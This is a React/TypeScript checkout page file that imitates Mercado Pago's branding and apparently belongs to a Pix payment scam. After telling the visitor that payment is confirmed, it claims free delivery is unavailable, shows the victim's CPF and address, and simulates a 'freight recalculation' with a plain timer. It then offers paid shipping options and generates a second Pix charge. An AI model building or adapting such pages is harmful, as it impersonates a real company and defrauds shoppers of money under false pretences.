import { createFileRoute } from "@tanstack/react-router"
import { useEffect, useState } from "react"
import { AlertTriangle, ArrowRight, Check, Loader2, MapPin, Truck, User } from "lucide-react"
import { MercadoPagoHeader } from "@/components/mercado-pago-header"
import { buildCheckoutOrderPayload, getCheckoutRef } from "@/lib/checkout-order"
import { useRouter } from "@/lib/next-compat"

function Price({ value }: { value: number }) {
  const [reais, centavos] = value.toFixed(2).split(".")
  return (
    <span className="text-[22px] font-semibold text-[#333]">
      R$ {reais}
      <sup className="text-[0.6em] -top-[0.3em] relative ml-px">{centavos}</sup>
    </span>
  )
}

type Customer = { name?: string; email?: string; phone?: string; cpf?: string }
type Address = Record<string, unknown>

function readJSON<T>(key: string): T | null {
  try {
    const raw = sessionStorage.getItem(key)
    return raw ? (JSON.parse(raw) as T) : null
  } catch {
    return null
  }
}

function FreteIndisponivelPage() {
  const router = useRouter()
  const [ready, setReady] = useState(false)
  const [customer, setCustomer] = useState<Customer>({})
  const [address, setAddress] = useState<Address>({})
  const [recalculating, setRecalculating] = useState(false)
  const [options, setOptions] = useState(false)
  const [selected, setSelected] = useState<"economico" | "expresso" | null>(null)
  const [greenSymbol, setGreenSymbol] = useState(false)
  const [engulfed, setEngulfed] = useState(false)

  useEffect(() => {
    // Esta tela só existe depois da confirmação do pagamento.
    if (sessionStorage.getItem("checkout_paid") !== "1") {
      router.push("/")
      return
    }
    setCustomer(readJSON<Customer>("checkout_customer") ?? {})
    setAddress(readJSON<Address>("checkout_address") ?? {})
    setReady(true)
  }, [router])

  const recalcular = () => {
    setRecalculating(true)
    window.setTimeout(() => {
      setRecalculating(false)
      setOptions(true)
    }, 1400)
  }

  const confirmarFrete = async () => {
    if (!selected) return
    const startedAt = Date.now()
    const base = buildCheckoutOrderPayload()
    const payload = {
      ...base,
      checkoutRef: `${getCheckoutRef()}-frete`,
      items: [],
      insuranceMonths: null,
      shippingId: selected === "economico" ? "frete_20" : "frete_7",
      shippingDate: null,
      freightOnly: true,
    }
    let pixData: Record<string, unknown>
    try {
      const response = await fetch("/api/pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      })
      pixData = (await response.json()) as Record<string, unknown>
      if (!response.ok || !pixData.brCode) {
        pixData = { error: (pixData.error as string) || "Não foi possível gerar seu Pix agora. Tente novamente em alguns instantes." }
      }
    } catch {
      pixData = { error: "Não foi possível gerar seu Pix agora. Tente novamente em alguns instantes." }
    }
    try {
      sessionStorage.setItem("checkout_frete_pix_payment", JSON.stringify(pixData))
    } catch {
      /* ignora falha de armazenamento */
    }
    const wait = Math.max(0, 900 - (Date.now() - startedAt))
    window.setTimeout(() => setGreenSymbol(true), wait)
    window.setTimeout(() => setEngulfed(true), wait + 650)
    window.setTimeout(() => router.push("/checkout/frete-pix"), wait + 720)
  }

  if (greenSymbol) {
    return (
      <main className="fixed inset-0 z-50 flex items-center justify-center bg-white">
        <div className="relative flex items-center justify-center">
          <div
            className={`rounded-full bg-ml-green transition-transform duration-[500ms] ease-in-out ${engulfed ? "scale-[80]" : "scale-100"}`}
            style={{ width: 64, height: 64, transformOrigin: "center center" }}
          >
            <div className={`flex h-full w-full items-center justify-center gap-1.5 transition-opacity duration-200 ${engulfed ? "opacity-0" : "opacity-100"}`}>
              <span className="size-2 rounded-full bg-white animate-[green-dot-bounce_1s_ease-in-out_infinite]" style={{ animationDelay: "0ms" }} />
              <span className="size-2 rounded-full bg-white animate-[green-dot-bounce_1s_ease-in-out_infinite]" style={{ animationDelay: "150ms" }} />
              <span className="size-2 rounded-full bg-white animate-[green-dot-bounce_1s_ease-in-out_infinite]" style={{ animationDelay: "300ms" }} />
            </div>
          </div>
        </div>
      </main>
    )
  }

  const str = (key: string) => {
    const value = address[key]
    return value == null || value === "" ? null : String(value)
  }

  const cep = str("cep")
  const cepFormatted = cep && cep.length === 8 ? `${cep.slice(0, 5)}-${cep.slice(5)}` : cep

  if (!ready) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f5f5f5]">
        <Loader2 className="w-5 h-5 animate-spin text-[#3483fa]" />
      </div>
    )
  }

  const rows: [string, string | null][] = [
    ["Nome", customer.name ?? null],
    ["CPF", customer.cpf ?? null],
    ["E-mail", customer.email ?? null],
    ["Telefone", customer.phone ?? null],
  ]

  const addressRows: [string, string | null][] = [
    ["CEP", cepFormatted],
    ["Endereço", str("street")],
    ["Número", str("streetNumber")],
    ["Complemento", str("complement")],
    ["Bairro", str("neighborhood")],
    ["Cidade", str("city")],
    ["Estado", str("state")],
  ]

  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5] pb-[60px]">
      <MercadoPagoHeader />

      <main className="flex-1 max-w-[700px] mx-auto w-full px-4 py-6 md:py-10">
        {/* Pagamento confirmado */}
        <div className="bg-white rounded-lg border border-[#e0e0e0] px-4 md:px-6 py-4 mb-4 flex items-center gap-3">
          <div className="w-[28px] h-[28px] rounded-full bg-[#00a650] flex items-center justify-center flex-shrink-0">
            <Check className="w-4 h-4 text-white" />
          </div>
          <p className="text-[14px] text-[#333]">
            {"Pagamento confirmado. "}
            <span className="text-[#999]">{"Falta apenas ajustar o envio."}</span>
          </p>
        </div>

        {/* Erro de frete */}
        <div className="bg-white rounded-lg border border-[#e0e0e0] overflow-hidden">
          <div className="bg-[#fff5f5] border-b border-[#f5d5d5] px-4 md:px-6 py-5 flex items-start gap-3">
            <AlertTriangle className="w-6 h-6 text-[#e44] flex-shrink-0 mt-[2px]" />
            <div>
              <h1 className="text-[18px] md:text-[20px] font-semibold text-[#333] mb-1">
                {"Não é possível Entregar Grátis no endereço"}
              </h1>
              <p className="text-[13px] md:text-[14px] text-[#666] leading-relaxed">
                {"Não é possível Entregar Grátis no endereço informado. Confira seus dados abaixo e recalcule o frete para concluir o pedido."}
              </p>
            </div>
          </div>

          <div className="px-4 md:px-6 py-5">
            <h2 className="text-[14px] font-semibold text-[#333] mb-3 flex items-center gap-2">
              <User className="w-4 h-4 text-[#3483fa]" />
              {"Seus dados"}
            </h2>
            <div className="rounded-lg border border-[#e0e0e0] divide-y divide-[#eee] mb-5">
              {rows.map(([label, value]) => (
                <div key={label} className="flex items-center justify-between gap-4 px-4 py-3">
                  <span className="text-[13px] text-[#999]">{label}</span>
                  <span className="text-[13px] text-[#333] text-right break-all">{value ?? "—"}</span>
                </div>
              ))}
            </div>

            <h2 className="text-[14px] font-semibold text-[#333] mb-3 flex items-center gap-2">
              <MapPin className="w-4 h-4 text-[#3483fa]" />
              {"Endereço de entrega"}
            </h2>
            <div className="rounded-lg border border-[#e0e0e0] divide-y divide-[#eee]">
              {addressRows.map(([label, value]) => (
                <div key={label} className="flex items-center justify-between gap-4 px-4 py-3">
                  <span className="text-[13px] text-[#999]">{label}</span>
                  <span className="text-[13px] text-[#333] text-right break-all">{value ?? "—"}</span>
                </div>
              ))}
            </div>

            {!options && (
              <button
                onClick={recalcular}
                disabled={recalculating}
                className="mt-6 w-full h-[48px] bg-[#3483fa] hover:bg-[#2968c8] text-white rounded-[6px] font-bold text-[14px] uppercase tracking-wide cursor-pointer flex items-center justify-center gap-2 disabled:opacity-70 transition-colors duration-200"
              >
                {recalculating ? <Loader2 className="w-4 h-4 animate-spin" /> : <Truck className="w-4 h-4" />}
                {recalculating ? "Recalculando..." : "Recalcular frete"}
              </button>
            )}

            {options && (
              <div className="mt-6">
                <p className="text-[14px] font-medium text-[#333] mb-3">
                  {"Escolha o melhor frete para você"}
                </p>
                <div className="rounded-lg border border-[#e0e0e0] divide-y divide-[#eee]">
                  {[
                    { id: "economico" as const, title: "Frete econômico", days: "Chega em até 20 dias úteis", price: 37.99 },
                    { id: "expresso" as const, title: "Frete expresso", days: "Chega em até 7 dias úteis", price: 64.99 },
                  ].map((option) => (
                    <button
                      key={option.id}
                      onClick={() => setSelected(option.id)}
                      className="w-full flex items-center gap-3 px-4 py-4 text-left cursor-pointer bg-transparent border-none"
                    >
                      <span
                        className={`w-[18px] h-[18px] rounded-full border-2 flex items-center justify-center flex-shrink-0 ${
                          selected === option.id ? "border-[#3483fa]" : "border-[#ccc]"
                        }`}
                      >
                        {selected === option.id && <span className="w-[10px] h-[10px] rounded-full bg-[#3483fa]" />}
                      </span>
                      <span className="flex-1">
                        <span className="block text-[14px] font-medium text-[#333]">{option.title}</span>
                        <span className="block text-[13px] text-[#999]">{option.days}</span>
                      </span>
                      <Price value={option.price} />
                    </button>
                  ))}
                </div>

                <button
                  onClick={confirmarFrete}
                  disabled={!selected}
                  className="mt-6 w-full h-[48px] bg-[#3483fa] hover:bg-[#2968c8] text-white rounded-[6px] font-bold text-[14px] uppercase tracking-wide cursor-pointer flex items-center justify-center gap-2 disabled:opacity-60 transition-colors duration-200"
                >
                  {"Confirmar frete"}
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            )}
          </div>
        </div>
      </main>

      <div className="bg-[#c5ddf5] py-3 text-center">
        <div className="flex flex-col items-center justify-center gap-2 text-[11px] text-[#666]">
          <span>{"Formas de pagamento"}</span>
          <img src="/images/card-pix.png" alt="Pix" className="h-[24px] w-auto object-contain" />
        </div>
      </div>
      <div className="text-center py-3 text-[12px] text-[#999]">{"© 2026 Mercado Pago"}</div>
    </div>
  )
}

export const Route = createFileRoute("/checkout/frete-indisponivel")({
  head: () => ({
    meta: [
      { title: "Ajuste do frete | Mercado Pago" },
      { name: "description", content: "Recalcule o frete do seu pedido para concluir a entrega." },
      { property: "og:title", content: "Ajuste do frete | Mercado Pago" },
      { property: "og:description", content: "Recalcule o frete do seu pedido para concluir a entrega." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: FreteIndisponivelPage,
})
